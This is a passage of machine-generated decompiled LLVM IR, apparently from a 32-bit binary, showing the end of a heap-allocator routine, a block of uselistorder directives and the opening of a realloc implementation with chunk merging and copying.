dec_label_pc_80539da:                             ; preds = %dec_label_pc_8053996
  store i32 %v1_80536d6, i32* %esi.global-to-local, align 4
  %v2_80539e0 = sub i32 %v1_80539d1, %v1_80536d6
  store i32 %v2_80539e0, i32* %ecx.global-to-local, align 4
  %v2_80539e2 = add i32 %v0_80539a7, %v1_80536d6
  store i32 %v2_80539e2, i32* @edx, align 4
  %v1_80539e5 = or i32 %v1_80536d6, 1
  store i32 %v1_80539e5, i32* %eax.global-to-local, align 4
  store i32 %v2_80539e2, i32* @global_var_806188c.495, align 4
  store i32 %v1_80539e5, i32* %v2_80539ce, align 4
  %v0_80539f1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80539f1

dec_label_pc_80539f1:                             ; preds = %dec_label_pc_805365c, %dec_label_pc_80539da
  %v0_80539f1 = phi i32 [ %v5_805366f, %dec_label_pc_805365c ], [ %v0_80539f1.pre, %dec_label_pc_80539da ]
  %v1_80539f1 = or i32 %v0_80539f1, 1
  store i32 %v1_80539f1, i32* @ecx, align 4
  %v0_80539f4 = load i32, i32* @ebx, align 4
  %v1_80539f4 = add i32 %v0_80539f4, 8
  store i32 %v1_80539f4, i32* %ebx.global-to-local, align 4
  %v1_80539f7 = load i32, i32* @edx, align 4
  %v2_80539f7 = add i32 %v1_80539f7, 4
  %v3_80539f7 = inttoptr i32 %v2_80539f7 to i32*
  store i32 %v1_80539f1, i32* %v3_80539f7, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_80539fc:                             ; preds = %dec_label_pc_805340e
  %v5_8053a02 = sub i32 %v1_80533f1, %v1_80536d6
  store i32 %v5_8053a02, i32* %eax.global-to-local, align 4
  %v2_8053a06 = add i32 %v0_80534bc118, %v1_80536d6
  store i32 %v2_8053a06, i32* @edx, align 4
  %v1_8053a0a = or i32 %v1_80536d6, 1
  store i32 %v2_8053a06, i32* @global_var_8061890.496, align 16
  store i32 %v1_8053a0a, i32* %v2_80533eb, align 4
  %v0_8053a16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a18 = or i32 %v0_8053a16, 1
  store i32 %v1_8053a18, i32* @ecx, align 4
  %v0_8053a1b = load i32, i32* @edx, align 4
  store i32 %v0_8053a1b, i32* @global_var_806189c.513, align 4
  store i32 %v0_8053a1b, i32* @global_var_80618a0.498, align 32
  %v1_8053a27 = add i32 %v0_8053a1b, 8
  %v2_8053a27 = inttoptr i32 %v1_8053a27 to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8053a27, align 4
  %v0_8053a2e = load i32, i32* @edx, align 4
  %v1_8053a2e = add i32 %v0_8053a2e, 12
  %v2_8053a2e = inttoptr i32 %v1_8053a2e to i32*
  store i32 ptrtoint (i32* @global_var_8061894.497 to i32), i32* %v2_8053a2e, align 4
  %v0_8053a35 = load i32, i32* @ecx, align 4
  %v1_8053a35 = load i32, i32* @edx, align 4
  %v2_8053a35 = add i32 %v1_8053a35, 4
  %v3_8053a35 = inttoptr i32 %v2_8053a35 to i32*
  store i32 %v0_8053a35, i32* %v3_8053a35, align 4
  %v0_8053a38 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a38 = load i32, i32* @edx, align 4
  %v3_8053a38 = add i32 %v1_8053a38, %v0_8053a38
  %v4_8053a38 = inttoptr i32 %v3_8053a38 to i32*
  store i32 %v0_8053a38, i32* %v4_8053a38, align 4
  br label %dec_label_pc_8053a46

dec_label_pc_8053a3d:                             ; preds = %dec_label_pc_805341d
  store i32 %v1_80536d6, i32* %ebx.global-to-local, align 4
  %v0_8053a41 = load i32, i32* @ebp, align 4
  %v2_8053a41 = or i32 %v1_80536d6, 4
  %v3_8053a41 = add i32 %v0_8053a41, %v2_8053a41
  %v4_8053a41 = inttoptr i32 %v3_8053a41 to i32*
  %v5_8053a41 = load i32, i32* %v4_8053a41, align 4
  %v6_8053a41 = or i32 %v5_8053a41, 1
  store i32 %v6_8053a41, i32* %v4_8053a41, align 4
  br label %dec_label_pc_8053a46

dec_label_pc_8053a46:                             ; preds = %dec_label_pc_80539fc, %dec_label_pc_8053a3d
  %v0_8053a46 = load i32, i32* @ebp, align 4
  %v1_8053a46 = add i32 %v0_8053a46, 8
  store i32 %v1_8053a46, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_8053a4b:                             ; preds = %dec_label_pc_805350d
  %v1_8053a4b = load i32, i32* @ebx, align 4
  %v2_8053a4b = add i32 %v0_8053519, 4
  %v3_8053a4b = add i32 %v2_8053a4b, %v1_8053a4b
  %v4_8053a4b = inttoptr i32 %v3_8053a4b to i32*
  %v5_8053a4b = load i32, i32* %v4_8053a4b, align 4
  %v6_8053a4b = or i32 %v5_8053a4b, 1
  store i32 %v6_8053a4b, i32* %v4_8053a4b, align 4
  br label %dec_label_pc_8053a50

dec_label_pc_8053a50:                             ; preds = %dec_label_pc_8053525, %dec_label_pc_8053a4b
  %v0_8053a50 = load i32, i32* @ecx, align 4
  store i32 %v0_8053a50, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_8053a54:                             ; preds = %dec_label_pc_80537f7, %dec_label_pc_8053996, %dec_label_pc_8053839, %dec_label_pc_805380f
  %v0_8053a54 = load i32, i32* %stack_var_-92, align 4
  %v1_8053a54 = call i32 @__errno_location(i32 %v0_8053a54)
  store i32 %v1_8053a54, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053a5b = inttoptr i32 %v1_8053a54 to i32*
  store i32 12, i32* %v1_8053a5b, align 4
  br label %dec_label_pc_8053a61

dec_label_pc_8053a61:                             ; preds = %dec_label_pc_8053a50, %dec_label_pc_8053a46, %dec_label_pc_80539f1, %dec_label_pc_8053687, %dec_label_pc_8053639, %dec_label_pc_80533b8, %dec_label_pc_8053a54
  store i32 %v2_80532ef, i32* @eax, align 4
  store i32 %v2_80532ef, i32* %stack_var_-92, align 4
  %v2_8053a6a = call i32 @__pthread_return_void(i32 %v2_80532ef, i32 1)
  store i32 %v2_8053a6a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053a72

dec_label_pc_8053a72:                             ; preds = %dec_label_pc_805330d, %dec_label_pc_8053a61
  %v0_8053a75 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053a75, i32* %eax.global-to-local, align 4
  %v2_8053a77 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053a77, i32* @ebx, align 4
  store i32 %v0_80532dc, i32* @esi, align 4
  store i32 %v0_80532db, i32* @edi, align 4
  store i32 %v0_80532da, i32* @ebp, align 4
  ret i32 %v0_8053a75

; uselistorder directives
  uselistorder i32 %v0_8053a38, { 1, 0 }
  uselistorder i32 %v1_80539bc, { 1, 0 }
  uselistorder i32 %v2_80539b0, { 1, 0 }
  uselistorder i32 %v0_805399b, { 1, 0 }
  uselistorder i32 %v0_8053996, { 0, 2, 1 }
  uselistorder i32 %v1_805392d, { 1, 0, 2 }
  uselistorder i32 %v0_805392d, { 1, 0 }
  uselistorder i32 %v2_805391b, { 1, 0 }
  uselistorder i32 %v1_80538d2, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80538c0, { 1, 0, 2 }
  uselistorder i32 %v2_80538b0, { 1, 2, 0 }
  uselistorder i32 %v2_80538ab, { 1, 0, 2 }
  uselistorder i32 %v1_805389b, { 2, 1, 0 }
  uselistorder i8 %v0_8053869, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805384c, { 1, 0, 2 }
  uselistorder i32 %v0_805390e, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8053900, { 2, 0, 1 }
  uselistorder i32 %v8_805381c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8053802, { 1, 0, 2 }
  uselistorder i32 %v3_8053802, { 1, 0 }
  uselistorder i32 %v1_80537d0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80537c4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80537c0, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_80537ae, { 1, 0 }
  uselistorder i32 %v1_805379e, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_805378e, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8053777, { 1, 0 }
  uselistorder i32 %v2_805376b, { 1, 0 }
  uselistorder i32 %v2_805375b, { 0, 3, 1, 2 }
  uselistorder i32 %v2_805373f, { 1, 2, 0 }
  uselistorder i32 %v1_805373f, { 1, 0, 2 }
  uselistorder i32 %v1_805373e, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8053738, { 1, 0 }
  uselistorder i32 %v2_8053716, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805370a, { 2, 1, 0 }
  uselistorder i32 %v8_80536f5, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_80536dc, { 1, 0, 2 }
  uselistorder i32 %v0_805367f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_805364e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8053641, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8053627, { 1, 0, 2 }
  uselistorder i32 %v1_80535c1, { 1, 0 }
  uselistorder i32 %v3_80535b6, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_80535b0, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_80535ad12, { 1, 0 }
  uselistorder i32 %v2_80535a2, { 1, 0 }
  uselistorder i32 %v1_8053586, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8053582, { 2, 1, 0 }
  uselistorder i32 %v1_805357e, { 1, 0 }
  uselistorder i32 %v1_8053579, { 2, 1, 0 }
  uselistorder i32 %v2_8053568, { 1, 0 }
  uselistorder i32 %v1_8053565, { 1, 2, 0, 3 }
  uselistorder i32 %v4_8053503, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_805354e, { 1, 0 }
  uselistorder i32 %v0_8053519, { 1, 2, 0, 3 }
  uselistorder i32 %v3_80534ef, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80534bc, { 0, 2, 1 }
  uselistorder i32 %v2_80534a0, { 1, 0 }
  uselistorder i32 %v1_8053496, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8053491.lcssa, { 1, 0 }
  uselistorder i32 %v3_8053481, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8053478, { 1, 0, 2 }
  uselistorder i32 %v3_805345b, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_8053454, { 1, 0, 2 }
  uselistorder i32 %v2_805343c, { 2, 1, 0 }
  uselistorder i32 %v0_8053428, { 2, 1, 3, 0 }
  uselistorder i32 %v3_80533ee, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80534bc118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80534bc109, { 1, 0, 2 }
  uselistorder i32 %v3_805339b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805338d, { 2, 1, 0 }
  uselistorder i32 %v2_8053368, { 2, 1, 0 }
  uselistorder i8 %v0_8053336, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_80536d6, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_805331f, { 1, 2, 0 }
  uselistorder i32 %v0_8053308, { 1, 0 }
  uselistorder i32 %v2_80532ef, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8061bc0.510, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134617236, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_80618a0.498, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_806188c.495 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_806188c.495 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053a72, { 1, 0 }
  uselistorder label %dec_label_pc_8053a61, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053a54, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053a50, { 1, 0 }
  uselistorder label %dec_label_pc_8053a46, { 1, 0 }
  uselistorder label %dec_label_pc_80539f1, { 1, 0 }
  uselistorder label %dec_label_pc_8053996, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053928, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053923, { 1, 0 }
  uselistorder label %dec_label_pc_8053907, { 1, 0 }
  uselistorder label %dec_label_pc_80538b0, { 1, 0 }
  uselistorder label %dec_label_pc_8053899, { 1, 0 }
  uselistorder label %dec_label_pc_8053882, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053839, { 1, 0 }
  uselistorder label %dec_label_pc_80537f7, { 1, 0 }
  uselistorder label %dec_label_pc_805378e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805372d, { 1, 0 }
  uselistorder label %dec_label_pc_8053641, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053639, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80535ad, { 1, 0 }
  uselistorder label %dec_label_pc_80535b2.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053586, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805350d, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_8053494, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805347d, { 1, 0 }
  uselistorder label %dec_label_pc_80533eb, { 1, 0 }
  uselistorder label %dec_label_pc_80534bc.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80533b8, { 1, 0 }
  uselistorder label %dec_label_pc_8053336, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8053a7e = load i32, i32* @esi, align 4
  %v0_8053a7f = load i32, i32* @ebx, align 4
  %v4_8053a83 = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_8053a8c = icmp eq i1 %v4_8053a83, false
  br i1 %v1_8053a8c, label %dec_label_pc_8053a9e, label %dec_label_pc_8053a8e

dec_label_pc_8053a8e:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8053a92 = call i32 @malloc(i32 %arg2)
  store i32 %v1_8053a92, i32* %eax.global-to-local, align 4
  store i32 %v1_8053a92, i32* @ebx, align 4
  br label %dec_label_pc_8053da5

dec_label_pc_8053a9e:                             ; preds = %entry
  %v1_8053a9e = icmp eq i32 %arg2, 0
  %v1_8053aa0 = icmp eq i1 %v1_8053a9e, false
  br i1 %v1_8053aa0, label %dec_label_pc_8053ab3, label %dec_label_pc_8053aa2

dec_label_pc_8053aa2:                             ; preds = %dec_label_pc_8053a9e
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8053aa9 = call i32 @free(i32 %tmp8)
  store i32 %v1_8053aa9, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053da5

dec_label_pc_8053ab3:                             ; preds = %dec_label_pc_8053a9e
  %v2_8053abe = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053abe, i32* @eax, align 4
  store i32 %v2_8053abe, i32* %stack_var_-60, align 4
  %v2_8053ac3 = call i32 @__pthread_return_void(i32 %v2_8053abe, i32 134565087)
  store i32 %v2_8053ac3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805b3f0.493 to i32), i32* %stack_var_-60, align 4
  %v1_8053acf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3f0.493 to i32))
  store i32 %v1_8053acf, i32* %eax.global-to-local, align 4
  %v0_8053ad7 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8053ad7, -32
  br i1 %tmp, label %dec_label_pc_8053aee, label %dec_label_pc_8053adc

dec_label_pc_8053adc:                             ; preds = %dec_label_pc_8053ab3
  %v0_8053adc = load i32, i32* %stack_var_-60, align 4
  %v1_8053adc = call i32 @__errno_location(i32 %v0_8053adc)
  store i32 %v1_8053adc, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8053ae3 = inttoptr i32 %v1_8053adc to i32*
  store i32 12, i32* %v1_8053ae3, align 4
  br label %dec_label_pc_8053da8

dec_label_pc_8053aee:                             ; preds = %dec_label_pc_8053ab3
  %v1_8053aee = add i32 %v0_8053ad7, 11
  %tmp22 = icmp ult i32 %v1_8053aee, 16
  br i1 %tmp22, label %dec_label_pc_8053b05, label %dec_label_pc_8053afe

dec_label_pc_8053afe:                             ; preds = %dec_label_pc_8053aee
  %v1_8053afe = and i32 %v1_8053aee, -8
  br label %dec_label_pc_8053b05

dec_label_pc_8053b05:                             ; preds = %dec_label_pc_8053aee, %dec_label_pc_8053afe
  %stack_var_-40.0 = phi i32 [ %v1_8053afe, %dec_label_pc_8053afe ], [ 16, %dec_label_pc_8053aee ]
  %storemerge21 = phi i32 [ %v1_8053afe, %dec_label_pc_8053afe ], [ %v1_8053aee, %dec_label_pc_8053aee ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_8053b09 = add i32 %tmp8, -8
  store i32 %v1_8053b09, i32* @edi, align 4
  %v1_8053b0c = add i32 %tmp8, -4
  %v2_8053b0c = inttoptr i32 %v1_8053b0c to i32*
  %v3_8053b0c = load i32, i32* %v2_8053b0c, align 4
  store i32 %v3_8053b0c, i32* @edx, align 4
  %v1_8053b11 = and i32 %v3_8053b0c, -4
  store i32 %v1_8053b11, i32* %eax.global-to-local, align 4
  %v2_8053b14 = and i32 %v3_8053b0c, 2
  %v3_8053b14 = icmp eq i32 %v2_8053b14, 0
  %v1_8053b1b = icmp eq i1 %v3_8053b14, false
  br i1 %v1_8053b1b, label %dec_label_pc_8053cb5, label %dec_label_pc_8053b21

dec_label_pc_8053b21:                             ; preds = %dec_label_pc_8053b05
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053b11, i32* @ebx, align 4
  %v7_8053b27 = icmp ult i32 %v1_8053b11, %stack_var_-40.0
  %v1_8053b29 = icmp eq i1 %v7_8053b27, false
  br i1 %v1_8053b29, label %dec_label_pc_8053c60, label %dec_label_pc_8053b2f

dec_label_pc_8053b2f:                             ; preds = %dec_label_pc_8053b21
  %v2_8053b2f = add i32 %v1_8053b11, %v1_8053b09
  store i32 %v2_8053b2f, i32* @esi, align 4
  %v1_8053b32 = load i32, i32* @global_var_806188c.495, align 4
  %v12_8053b32 = icmp eq i32 %v2_8053b2f, %v1_8053b32
  %v1_8053b38 = icmp eq i1 %v12_8053b32, false
  %v1_8053b72 = add i32 %v2_8053b2f, 4
  %v2_8053b72 = inttoptr i32 %v1_8053b72 to i32*
  %v3_8053b72 = load i32, i32* %v2_8053b72, align 4
  br i1 %v1_8053b38, label %dec_label_pc_8053b72, label %dec_label_pc_8053b3a

dec_label_pc_8053b3a:                             ; preds = %dec_label_pc_8053b2f
  %v1_8053b3f = and i32 %v3_8053b72, -4
  %v2_8053b42 = add i32 %v1_8053b3f, %v1_8053b11
  store i32 %v2_8053b42, i32* %ecx.global-to-local, align 4
  %v1_8053b48 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8053b48, i32* %eax.global-to-local, align 4
  %v7_8053b4b = icmp ult i32 %v2_8053b42, %v1_8053b48
  br i1 %v7_8053b4b, label %dec_label_pc_8053bb0, label %dec_label_pc_8053b4f

dec_label_pc_8053b4f:                             ; preds = %dec_label_pc_8053b3a
  %v1_8053b4f = urem i32 %v3_8053b0c, 2
  %v5_8053b52 = or i32 %v1_8053b4f, %stack_var_-40.0
  store i32 %v5_8053b52, i32* @edx, align 4
  store i32 %v5_8053b52, i32* %v2_8053b0c, align 4
  %v0_8053b5d = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053b5d = sub i32 %v0_8053b5d, %stack_var_-40.0
  %v0_8053b5f = load i32, i32* @edi, align 4
  %v2_8053b5f = add i32 %v0_8053b5f, %stack_var_-40.0
  store i32 %v2_8053b5f, i32* %eax.global-to-local, align 4
  %v1_8053b62 = or i32 %v2_8053b5d, 1
  store i32 %v1_8053b62, i32* %ecx.global-to-local, align 4
  store i32 %v2_8053b5f, i32* @global_var_806188c.495, align 4
  %v2_8053b6a = add i32 %v2_8053b5f, 4
  %v3_8053b6a = inttoptr i32 %v2_8053b6a to i32*
  store i32 %v1_8053b62, i32* %v3_8053b6a, align 4
  br label %dec_label_pc_8053d93

dec_label_pc_8053b72:                             ; preds = %dec_label_pc_8053b2f
  %v1_8053b77 = and i32 %v3_8053b72, -2
  store i32 %v1_8053b77, i32* %eax.global-to-local, align 4
  %v3_8053b7a = add i32 %v1_8053b72, %v1_8053b77
  %v4_8053b7a = inttoptr i32 %v3_8053b7a to i8*
  %v5_8053b7a = load i8, i8* %v4_8053b7a, align 1
  %v6_8053b7a = urem i8 %v5_8053b7a, 2
  %v7_8053b7a = icmp eq i8 %v6_8053b7a, 0
  %v1_8053b7f = icmp eq i1 %v7_8053b7a, false
  br i1 %v1_8053b7f, label %dec_label_pc_8053bb0, label %dec_label_pc_8053b81

dec_label_pc_8053b81:                             ; preds = %dec_label_pc_8053b72
  %v1_8053b85 = and i32 %v3_8053b72, -4
  %v2_8053b88 = add i32 %v1_8053b85, %v1_8053b11
  store i32 %v2_8053b88, i32* @ebx, align 4
  %v10_8053b8a = icmp ult i32 %v2_8053b88, %stack_var_-40.0
  br i1 %v10_8053b8a, label %dec_label_pc_8053bb0, label %dec_label_pc_8053b90

dec_label_pc_8053b90:                             ; preds = %dec_label_pc_8053b81
  %v1_8053b90 = add i32 %v1_8053b11, %tmp8
  %v2_8053b90 = inttoptr i32 %v1_8053b90 to i32*
  %v3_8053b90 = load i32, i32* %v2_8053b90, align 4
  store i32 %v3_8053b90, i32* @edx, align 4
  %v1_8053b93 = add i32 %v2_8053b2f, 12
  %v2_8053b93 = inttoptr i32 %v1_8053b93 to i32*
  %v3_8053b93 = load i32, i32* %v2_8053b93, align 4
  store i32 %v3_8053b93, i32* %eax.global-to-local, align 4
  %v1_8053b96 = add i32 %v3_8053b90, 12
  %v2_8053b96 = inttoptr i32 %v1_8053b96 to i32*
  %v3_8053b96 = load i32, i32* %v2_8053b96, align 4
  %v15_8053b96 = icmp eq i32 %v3_8053b96, %v2_8053b2f
  %v1_8053b99 = icmp eq i1 %v15_8053b96, false
  br i1 %v1_8053b99, label %dec_label_pc_8053ba0, label %dec_label_pc_8053b9b

dec_label_pc_8053b9b:                             ; preds = %dec_label_pc_8053b90
  %v1_8053b9b = add i32 %v3_8053b93, 8
  %v2_8053b9b = inttoptr i32 %v1_8053b9b to i32*
  %v3_8053b9b = load i32, i32* %v2_8053b9b, align 4
  %v15_8053b9b = icmp eq i32 %v3_8053b9b, %v2_8053b2f
  br i1 %v15_8053b9b, label %dec_label_pc_8053ba5, label %dec_label_pc_8053ba0

dec_label_pc_8053ba0:                             ; preds = %dec_label_pc_8053b9b, %dec_label_pc_8053b90
  %v0_8053ba0 = call i32 @abort()
  store i32 %v0_8053ba0, i32* %eax.global-to-local, align 4
  %v1_8053ba5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053ba5

dec_label_pc_8053ba5:                             ; preds = %dec_label_pc_8053b9b, %dec_label_pc_8053ba0
  %v1_8053ba5 = phi i32 [ %v3_8053b90, %dec_label_pc_8053b9b ], [ %v1_8053ba5.pre, %dec_label_pc_8053ba0 ]
  %v0_8053ba5 = phi i32 [ %v3_8053b93, %dec_label_pc_8053b9b ], [ %v0_8053ba0, %dec_label_pc_8053ba0 ]
  %v2_8053ba5 = add i32 %v1_8053ba5, 12
  %v3_8053ba5 = inttoptr i32 %v2_8053ba5 to i32*
  store i32 %v0_8053ba5, i32* %v3_8053ba5, align 4
  %v0_8053ba8 = load i32, i32* @edx, align 4
  %v1_8053ba8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053ba8 = add i32 %v1_8053ba8, 8
  %v3_8053ba8 = inttoptr i32 %v2_8053ba8 to i32*
  store i32 %v0_8053ba8, i32* %v3_8053ba8, align 4
  %v0_8053c60.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053c60

dec_label_pc_8053bb0:                             ; preds = %dec_label_pc_8053b81, %dec_label_pc_8053b72, %dec_label_pc_8053b3a
  %v1_8053bb7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053bb7, i32* %eax.global-to-local, align 4
  store i32 %v1_8053bb7, i32* %stack_var_-60, align 4
  %v1_8053bbb = call i32 @malloc(i32 %v1_8053bb7)
  store i32 %v1_8053bbb, i32* %eax.global-to-local, align 4
  %v1_8053bc3 = icmp eq i32 %v1_8053bbb, 0
  store i32 %v1_8053bbb, i32* @edx, align 4
  br i1 %v1_8053bc3, label %dec_label_pc_8053d8f, label %dec_label_pc_8053bcd

dec_label_pc_8053bcd:                             ; preds = %dec_label_pc_8053bb0
  %v1_8053bcd = add i32 %v1_8053bbb, -8
  store i32 %v1_8053bcd, i32* %ebx.global-to-local, align 4
  %v1_8053bd0 = load i32, i32* @esi, align 4
  %v12_8053bd0 = icmp eq i32 %v1_8053bcd, %v1_8053bd0
  %v1_8053bd2 = add i32 %v1_8053bbb, -4
  %v2_8053bd2 = inttoptr i32 %v1_8053bd2 to i32*
  %v3_8053bd2 = load i32, i32* %v2_8053bd2, align 4
  store i32 %v3_8053bd2, i32* %eax.global-to-local, align 4
  %v1_8053bd5 = icmp eq i1 %v12_8053bd0, false
  br i1 %v1_8053bd5, label %dec_label_pc_8053be3, label %dec_label_pc_8053bd7

dec_label_pc_8053bd7:                             ; preds = %dec_label_pc_8053bcd
  store i32 %v1_8053b11, i32* @edx, align 4
  %v1_8053bdb = and i32 %v3_8053bd2, -4
  store i32 %v1_8053bdb, i32* %eax.global-to-local, align 4
  %v2_8053bde = add i32 %v1_8053bdb, %v1_8053b11
  store i32 %v2_8053bde, i32* @ebx, align 4
  br label %dec_label_pc_8053c60

dec_label_pc_8053be3:                             ; preds = %dec_label_pc_8053bcd
  %v1_8053be7 = add i32 %v1_8053b11, -4
  store i32 %v1_8053be7, i32* %eax.global-to-local, align 4
  %v2_8053bec = udiv i32 %v1_8053be7, 4
  store i32 %v2_8053bec, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_8053be7, 37
  br i1 %tmp23, label %dec_label_pc_8053c05, label %dec_label_pc_8053bf4

dec_label_pc_8053bf4:                             ; preds = %dec_label_pc_8053be3
  store i32 %v1_8053bbb, i32* %stack_var_-60, align 4
  %v3_8053bfb = inttoptr i32 %v1_8053bbb to i16*
  %v4_8053bfb = call i32 @memcpy(i16* %v3_8053bfb, i32 %tmp8, i32 %v1_8053be7)
  store i32 %v4_8053bfb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c4c

dec_label_pc_8053c05:                             ; preds = %dec_label_pc_8053be3
  store i32 %tmp8, i32* @esi, align 4
  %v2_8053c0c = load i32, i32* %arg1, align 4
  store i32 %v2_8053c0c, i32* %eax.global-to-local, align 4
  %v2_8053c0e = inttoptr i32 %v1_8053bbb to i32*
  store i32 %v2_8053c0c, i32* %v2_8053c0e, align 4
  %v0_8053c10 = load i32, i32* @esi, align 4
  %v1_8053c10 = add i32 %v0_8053c10, 4
  %v2_8053c10 = inttoptr i32 %v1_8053c10 to i32*
  %v3_8053c10 = load i32, i32* %v2_8053c10, align 4
  store i32 %v3_8053c10, i32* %eax.global-to-local, align 4
  %v1_8053c13 = load i32, i32* @edx, align 4
  %v2_8053c13 = add i32 %v1_8053c13, 4
  %v3_8053c13 = inttoptr i32 %v2_8053c13 to i32*
  store i32 %v3_8053c10, i32* %v3_8053c13, align 4
  %v0_8053c16 = load i32, i32* @esi, align 4
  %v1_8053c16 = add i32 %v0_8053c16, 8
